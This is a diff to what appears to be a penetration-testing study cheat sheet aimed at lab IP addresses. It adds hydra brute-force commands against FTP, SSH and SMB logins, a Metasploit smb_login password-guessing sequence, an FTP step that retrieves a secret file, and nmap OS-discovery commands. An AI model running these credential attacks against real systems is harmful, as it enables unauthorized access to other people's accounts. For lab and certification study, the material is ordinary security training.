@@ -64,15 +64,33 @@ run
 
 * Bruteforce Using hydra
 
+#FTP
+
+hydra -L /Desktop/users.txt -p butterfly ftp://10.10.1.10 -V
+
+#SSH
+
 hydra -L /Desktop/users.txt -P /Desktop/password.txt 10.10.1.10 ssh
 hydra -l admin -P /Desktop/password.txt 10.10.1.10 ssh
 hydra -L /Desktop/users.txt -p butterfly 10.10.1.10 ssh
+
 ftp 10.10.1.10
 username:
 password:
 
 To get secret file from ftp server
 get secret.txt
+
+#SMB
+
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+
+use auxiliary/scanner/smb/smb_login
+msf exploit (smb_login)>set rhosts 192.168.1.118
+msf exploit (smb_login)>set user_file /root/Desktop/user.txt
+msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
+msf exploit (smb_login)>set stop_on_success true
+msf exploit (smb_login)>exploit
 
 * Hacking android
 
@@ -200,6 +218,10 @@ Host: DC
 Domain: pentester.team
 
 FQDN = DC.pentester.team
+
+OR try
+nmap -A “ip”
+“nmap —script smb-os-discovery ‘ip’ “
 
 * Hacking wifi n/w 
 
